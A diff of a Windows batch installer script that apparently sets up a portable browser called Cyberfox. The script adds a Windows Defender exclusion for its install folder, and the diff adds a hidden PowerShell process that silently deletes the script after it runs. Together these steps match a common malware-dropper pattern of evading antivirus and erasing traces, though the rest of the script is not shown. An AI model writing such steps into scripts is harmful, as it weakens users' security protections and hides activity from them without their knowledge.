@@ -31,7 +31,7 @@ if %errorlevel% equ 2 (
     exit /b
 )
 
-:: Create workspace folder (only one Cyberfox Portable inside AWS)
+:: Create Cyberfox Portable folder if it doesn't exist
 if not exist "!folder!\" (
     mkdir "!folder!"
     echo [SUCCESS] Created workspace: !folder!
@@ -39,7 +39,7 @@ if not exist "!folder!\" (
     echo [INFO] Workspace already exists: !folder!
 )
 
-:: Add Defender exclusion for Cyberfox Portable
+:: Add Defender exclusion for Cyberfox Portable folder
 echo [STEP] Adding Defender exclusion for: !folder!
 powershell -Command "Try { Add-MpPreference -ExclusionPath '!folder!' -ErrorAction Stop; Write-Host 'Defender exclusion added.' } Catch { Write-Host 'Failed to add Defender exclusion. You may need to run as Administrator.' }"
 
@@ -127,4 +127,8 @@ echo [INFO] Deleted Cyberfox ZIP file
 :: Open Cyberfox Portable folder
 start explorer "!folder!"
 
-exit /b
+:: Launch silent deletion in background (runs independently)
+start "" powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 5; Remove-Item -LiteralPath '%~f0' -Force"
+
+:: Close terminal immediately
+exit
